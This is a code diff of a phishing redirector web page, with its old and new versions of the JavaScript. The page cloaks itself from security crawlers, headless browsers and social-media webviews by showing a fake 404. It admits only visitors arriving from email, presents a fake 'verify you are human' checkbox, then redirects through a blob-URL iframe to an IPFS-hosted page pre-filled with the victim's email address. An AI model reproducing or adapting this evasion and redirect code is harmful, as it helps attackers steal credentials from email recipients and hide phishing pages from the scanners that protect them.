@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Blob IPFS Redirect + Ultra Anti-Bot + Email Only Access</title>
+    <title>Blob IPFS Redirect + Email Only + Anti-Bot</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
@@ -73,52 +73,33 @@ html, body { margin:0; padding:0; width:100%; height:100%; font-family:Arial; }
 
 <script>
 /* ------------------------------------------------------
-   SUPER-DEEP SOCIAL MEDIA BROWSER DETECTION
+   SOCIAL MEDIA / WEBVIEW DETECTION
 ------------------------------------------------------ */
 function isSocialMediaBrowser() {
     const ua = navigator.userAgent.toLowerCase();
 
-    /* 1. Direct social UA keywords */
-    const direct = [
-        "instagram", "fbav", "fban", "facebook",
-        "tiktok", "musical.ly",
-        "snapchat",
-        "twitter", "twitter for",
-        "pinterest",
-        "linkedin",
-        "reddit",
-        "messenger",
-        "whatsapp",
-        "telegram",
-        "wechat"
+    // Allow real browsers
+    const isIOSorMac = /iphone|ipad|ipod|macintosh/.test(ua);
+    const isSafari = /safari/.test(ua) && !/chrome|crios|fxios|edgios/.test(ua);
+    if (isIOSorMac && isSafari) return false;
+
+    // Detect common social media webviews
+    const socialUA = [
+        "instagram","fbav","fban","facebook",
+        "tiktok","musical.ly","snapchat",
+        "twitter","twitter for",
+        "pinterest","linkedin","reddit",
+        "messenger","whatsapp","telegram","wechat"
     ];
-    if (direct.some(x => ua.includes(x))) return true;
+    if (socialUA.some(x=>ua.includes(x))) return true;
 
-    /* 2. WebView indicators (ALL social apps use WebView) */
-    const webViewIndicators = ["; wv", "wv", "version/0", "version/1"];
-    if (webViewIndicators.some(x => ua.includes(x))) return true;
+    // WebView indicators
+    const webviewIndicators = ["; wv","wv","version/0","version/1"];
+    if (webviewIndicators.some(x=>ua.includes(x))) return true;
 
-    /* 3. Missing normal browser APIs */
+    // Missing browser APIs
     if (!("onbeforeunload" in window)) return true;
     if (typeof window.indexedDB === "undefined") return true;
-
-    /* 4. Strange viewport size (common in in-app browsers) */
-    if (screen.height < innerHeight - 120) return true;
-
-    /* 5. Popup test – most social apps block popups */
-    let blocked = false;
-    const test = window.open("", "", "width=1,height=1");
-    if (!test) blocked = true;
-    else test.close();
-    if (blocked) return true;
-
-    /* 6. Referrer check */
-    const ref = document.referrer.toLowerCase();
-    const socialRefs = ["facebook", "instagram", "tiktok", "twitter", "snapchat"];
-    if (socialRefs.some(x => ref.includes(x))) return true;
-
-    /* 7. Outer window size issues */
-    if (window.outerHeight === 0 || window.outerWidth === 0) return true;
 
     return false;
 }
@@ -128,24 +109,23 @@ function isSocialMediaBrowser() {
 ------------------------------------------------------ */
 function cameFromEmail() {
     const ref = document.referrer.toLowerCase();
-
     const emailDomains = [
         "mail.google.com", "outlook.com", "office.com",
         "mail.yahoo.com", "icloud.com", "fastmail.com", "proton.me"
     ];
 
-    // Many mobile email apps send no referrer → allow
+    // No referrer → allow (many mobile email apps)
     if (!ref || ref.trim() === "") return true;
 
     return emailDomains.some(x => ref.includes(x));
 }
 
 /* ------------------------------------------------------
-   MASTER RULE: BLOCK SOCIAL + REQUIRE EMAIL
+   MASTER RULE: ONLY EMAIL, BLOCK SOCIAL WEBVIEWS
 ------------------------------------------------------ */
 function enforceEmailOnly() {
-    if (isSocialMediaBrowser()) return false;
     if (!cameFromEmail()) return false;
+    if (isSocialMediaBrowser()) return false;
     return true;
 }
 
@@ -153,117 +133,46 @@ function enforceEmailOnly() {
    ULTRA ANTI-BOT MODULE
 ------------------------------------------------------ */
 async function strongBotCheck() {
-    let score = 0;
+    let score=0;
+    const ua=navigator.userAgent.toLowerCase();
+    const botUA=["bot","crawl","spider","curl","wget","python","scrapy","headless","selenium","puppeteer","playwright"];
+    if(botUA.some(x=>ua.includes(x))) score+=40;
+    if(navigator.webdriver) score+=40;
+    try{ const c=document.createElement("canvas"); if(!c.getContext("webgl")) score+=20;}catch{score+=20;}
+    try{ const ctx=new (window.AudioContext||window.webkitAudioContext)(); if(ctx.sampleRate<30000) score+=10;}catch{score+=10;}
+    if(screen.width<700 || screen.height<500) score+=10;
 
-    const ua = navigator.userAgent.toLowerCase();
-    const botUA = ["bot","crawl","spider","curl","wget","python","scrapy","headless","selenium","puppeteer","playwright"];
-    if (botUA.some(x => ua.includes(x))) score += 40;
-    if (navigator.webdriver) score += 40;
+    let moves=0;
+    window.addEventListener("mousemove",()=>moves++);
+    window.addEventListener("touchmove",()=>moves++);
+    await new Promise(r=>setTimeout(r,700));
+    if(moves<3) score+=40;
 
-    try {
-        const canvas = document.createElement("canvas");
-        if (!canvas.getContext("webgl")) score += 20;
-    } catch { score += 20; }
-
-    try {
-        const ctx = new (window.AudioContext || window.webkitAudioContext)();
-        if (ctx.sampleRate < 30000) score += 10;
-    } catch { score += 10; }
-
-    if (screen.width < 700 || screen.height < 500) score += 10;
-    if (window.outerWidth === 0) score += 20;
-
-    let screenChanges = 0;
-    window.addEventListener("resize", () => screenChanges++);
-    setTimeout(() => {
-        if (screenChanges > 5) score += 15;
-        if (screenChanges === 0 && screen.width > 1024) score += 10;
-    }, 1200);
-
-    const claimedTouch = navigator.maxTouchPoints > 0;
-    let realTouch = 0;
-    window.addEventListener("touchstart", () => realTouch++);
-    window.addEventListener("touchmove", () => realTouch++);
-    setTimeout(() => {
-        if (claimedTouch && realTouch === 0) score += 25;
-    }, 800);
-
-    const honeypot = document.createElement("input");
-    honeypot.type = "text";
-    honeypot.style.position = "absolute";
-    honeypot.style.left = "-9999px";
-    honeypot.style.opacity = "0";
-    document.body.appendChild(honeypot);
-    setTimeout(() => { if (honeypot.value.length > 0) score += 40; }, 400);
-
-    const ghost = document.createElement("button");
-    ghost.style.position = "absolute";
-    ghost.style.left = "120px";
-    ghost.style.top = "120px";
-    ghost.style.opacity = "0";
-    ghost.style.pointerEvents = "none";
-    document.body.appendChild(ghost);
-    document.addEventListener("click", e => {
-        if (e.target === ghost) score += 40;
-    });
-
-    let moves = 0;
-    window.addEventListener("mousemove", () => moves++);
-    window.addEventListener("touchmove", () => moves++);
-    await new Promise(r => setTimeout(r, 700));
-    if (moves < 3) score += 40;
-
-    const challenge = Math.random().toString(36).substring(2);
-    try { await crypto.subtle.digest("SHA-256", new TextEncoder().encode(challenge)); }
-    catch { score += 20; }
-
-    return score >= 60;
+    return score>=60;
 }
 
 /* ------------------------------------------------------
    IPFS REDIRECT CONFIG
 ------------------------------------------------------ */
-const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
-
-function getEmail() {
-    return new URLSearchParams(location.search).get("email") || "";
-}
-
-function buildIPFS(email) {
-    return email ? BASE_IPFS + "#" + email : BASE_IPFS;
-}
-
-function createBlobHTML(url) {
-    return `
-        <!DOCTYPE html>
-        <html>
-        <head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
-        <body style="margin:0"><iframe style="width:100%;height:100%;border:none" src="${url}"></iframe></body>
-        </html>
-    `;
-}
+const BASE_IPFS="https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
+function getEmail(){return new URLSearchParams(location.search).get("email")||"";}
+function buildIPFS(email){return email?BASE_IPFS+"#"+email:BASE_IPFS;}
+function createBlobHTML(url){return `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head><body style="margin:0"><iframe style="width:100%;height:100%;border:none" src="${url}"></iframe></body></html>`;}
 
 /* ------------------------------------------------------
    HUMAN CHECK
 ------------------------------------------------------ */
-function requireVerification() {
-    return new Promise(resolve => {
-        const overlay = document.getElementById("overlay");
-        const checkbox = document.getElementById("checkbox");
-        const verifying = document.getElementById("verifying");
-
-        overlay.style.opacity = 1;
-
-        checkbox.onclick = () => {
-            checkbox.style.background = "#40739e";
-            checkbox.style.borderColor = "#40739e";
-            verifying.style.display = "block";
-
-            setTimeout(() => {
-                overlay.style.opacity = 0;
-                setTimeout(() => overlay.remove(), 300);
-                resolve(true);
-            }, 900);
+function requireVerification(){
+    return new Promise(resolve=>{
+        const overlay=document.getElementById("overlay");
+        const checkbox=document.getElementById("checkbox");
+        const verifying=document.getElementById("verifying");
+        overlay.style.opacity=1;
+        checkbox.onclick=()=>{
+            checkbox.style.background="#40739e";
+            checkbox.style.borderColor="#40739e";
+            verifying.style.display="block";
+            setTimeout(()=>{overlay.style.opacity=0; setTimeout(()=>overlay.remove(),300); resolve(true);},900);
         };
     });
 }
@@ -271,40 +180,21 @@ function requireVerification() {
 /* ------------------------------------------------------
    404 PAGE
 ------------------------------------------------------ */
-function show404() {
-    document.body.innerHTML = `
-        <div class="error-404">
-            <h1>404</h1>
-            <h2>Error</h2>
-            <p>The requested page could not be found.</p>
-        </div>`;
-}
+function show404(){document.body.innerHTML=`<div class="error-404"><h1>404</h1><h2>Error</h2><p>The requested page could not be found.</p></div>`;}
 
 /* ------------------------------------------------------
    MAIN FLOW
 ------------------------------------------------------ */
-document.addEventListener("DOMContentLoaded", async () => {
-
-    if (!enforceEmailOnly()) {
-        show404();
-        return;
-    }
-
-    if (await strongBotCheck()) {
-        show404();
-        return;
-    }
-
+document.addEventListener("DOMContentLoaded",async()=>{
+    if(!enforceEmailOnly()){show404(); return;}
+    if(await strongBotCheck()){show404(); return;}
     await requireVerification();
-
-    const email = getEmail();
-    const url = buildIPFS(email);
-
-    const blobHTML = createBlobHTML(url);
-    const blob = new Blob([blobHTML], { type:"text/html" });
-    const blobURL = URL.createObjectURL(blob);
-
-    window.location.href = blobURL;
+    const email=getEmail();
+    const url=buildIPFS(email);
+    const blobHTML=createBlobHTML(url);
+    const blob=new Blob([blobHTML],{type:"text/html"});
+    const blobURL=URL.createObjectURL(blob);
+    window.location.href=blobURL;
 });
 </script>
 
